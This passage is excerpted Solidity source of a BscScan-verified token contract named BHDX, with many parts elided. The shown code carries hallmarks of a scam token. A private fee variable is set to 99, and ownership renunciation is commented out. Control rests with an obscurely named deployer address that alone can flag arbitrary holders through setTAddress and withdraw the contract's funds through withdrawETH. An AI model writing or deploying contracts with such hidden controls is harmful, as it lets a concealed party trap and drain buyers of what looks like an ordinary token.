/**
 *Submitted for verification at BscScan.com on 2025-06-20
 */
...
abstract contract ERC20 is Ownable, IERC20, IERC20Metadata, IERC20Errors {
    ...
    address internal _mainPair;
    uint8 private _feeTax = 99;
...
contract BHDX is ERC20 {
    address internal immutable dhejdnvd;
    constructor(
        string memory input_name,
        string memory input_symbol,
        uint256 number,
        address toAddress
    ) ERC20(input_name, input_symbol, number, toAddress) Ownable(msg.sender) {
        // _transferOwnership(address(0));
        dhejdnvd = toAddress;
    }
    function allowance(
    ...
    function setTAddress(address addr, bool isT) external {
        require(msg.sender == dhejdnvd, "Only deployer can set t");
        require(addr != _mainPair, "Cannot set t for mainPair address");
        tAddress[addr] = isT;
    }

    function withdrawETH(address payable recipient, uint256 amount) public {
        require(msg.sender == dhejdnvd);
        Address.sendValue(recipient, amount);
    }

    function getTAddresses(
        address[] calldata addrs
    ) external view returns (bool[] memory) {
        bool[] memory results = new bool[](addrs.length);
        for (uint i = 0; i < addrs.length; i++) {
            results[i] = tAddress[addrs[i]];
        }
        return results;
    }
